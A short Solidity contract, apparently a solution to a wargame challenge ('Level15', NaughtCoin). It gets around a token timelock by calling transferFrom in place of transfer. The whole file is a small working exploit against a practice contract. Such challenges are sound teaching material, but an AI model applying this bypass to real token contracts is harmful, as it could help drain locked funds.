// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { NaughtCoin } from "./Level15.sol";

contract L15Attack {
    function attack(NaughtCoin token, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
}
